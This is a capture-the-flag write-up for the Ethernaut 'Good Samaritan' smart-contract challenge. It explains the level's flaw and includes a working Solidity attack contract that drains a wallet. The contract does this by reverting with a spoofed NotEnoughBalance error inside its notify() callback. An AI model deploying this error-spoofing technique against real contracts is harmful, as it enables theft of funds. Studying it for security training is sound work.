# Level 24: [Good Samaritan](https://ethernaut.openzeppelin.com/level/0x8d07AC34D8f73e2892496c15223297e5B22B3ABE)

## Level objectives:
Drain all `Coins` from `Wallet`.
## Analysis
- Contracts:
    - `GoodSamaritan`
    - `Coin`
    - `Wallet`
    - `INotifyable` (interface)
- We interact with the `GoodSamaritan` using the `requestDonation()` function.
- It'll try to send 10 `Coins`; if that fails (due to low balance), it'll send whatever it has.
- Normally it shouldn't fail, cuz there'll be balance; but when `Coin` is transfered to a smart contract, it calls a `INotifyable(destination).notify()` function.
- This is where we hack; even though the transfer is successfull, we shall throw an error (the `NotEnoughBalance()` error) due to which the good samaritan will be tricked into sending us everything.
- Note: the `transferRemainder` will also eventually trigger `notify()`, so don't revert that lol!
## Code:
```sol
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.18;

interface GoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract AttackGoodSamaritan {
    GoodSamaritan victim = GoodSamaritan(0x51b624b6C893DC5C9FB0E84414F082727DbBc951);
    error NotEnoughBalance();
    
    function attack() public returns (bool) {
        bool enoughBalance = victim.requestDonation();
        return enoughBalance;
    }
    
    function notify(uint256 _amount) external {
        if (_amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
```